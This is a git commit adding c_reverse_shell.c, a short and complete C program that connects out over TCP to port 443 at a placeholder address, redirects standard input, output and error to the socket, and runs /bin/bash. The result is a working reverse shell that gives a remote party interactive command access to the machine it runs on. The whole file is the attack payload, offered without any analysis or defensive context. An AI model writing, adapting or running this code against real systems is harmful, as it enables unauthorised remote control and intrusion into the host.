b5a8842b0ebf527b1393c8d51253241b90d9cac3
Brooke <86805843+brookehorizon@users.noreply.github.com>
2021-12-05 10:31:45 -0700

    Create c_reverse_shell.c

---
+++ c_reverse_shell.c
@@ -0,0 +1,34 @@
+/* brookehorizon */
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    
+    int port = 443;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("0.0.0.0");
+    
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    
+    sizeof(revsockaddr));
+  
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+    
+    char * const argv[] = {"/bin/bash", NULL};
+    execve("/bin/bash", argv, NULL);
+
+    return 0;       
+}
